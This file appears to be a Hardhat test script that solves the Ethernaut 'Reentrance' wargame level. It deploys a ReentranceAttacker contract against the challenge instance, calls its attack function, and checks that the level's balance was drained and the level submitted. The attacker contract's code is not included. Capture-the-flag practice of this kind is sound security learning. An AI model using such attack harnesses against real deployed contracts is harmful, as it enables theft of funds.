import { expect } from "chai";
import { Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  const challengeFactory = await ethers.getContractFactory(`Reentrance`);
  const challengeAddress = await createChallenge(
    `0x2a24869323C0B13Dff24E196Ba072dC790D52479`,
    ethers.parseUnits(`0.001`, `ether`)
  );
  challenge = await challengeFactory.attach(challengeAddress);

  const attackerFactory = await ethers.getContractFactory(`ReentranceAttacker`);
  attacker = await attackerFactory.deploy(challenge.target);
  await attacker.waitForDeployment();
});

it("solves the challenge", async function () {
  console.log(
    `Challenge balance`,
    (await eoa.provider!.getBalance(challenge.target)).toString()
  );
  tx = await attacker.attack({
    value: ethers.parseUnits(`0.0001`, `ether`),
    gasLimit: 500000n
  });
  await tx.wait();
  console.log(
    `Challenge balance`,
    (await eoa.provider!.getBalance(challenge.target)).toString()
  );
});

after(async () => {
  expect(await submitLevel(challenge.target), "level not solved").to.be.true;
});
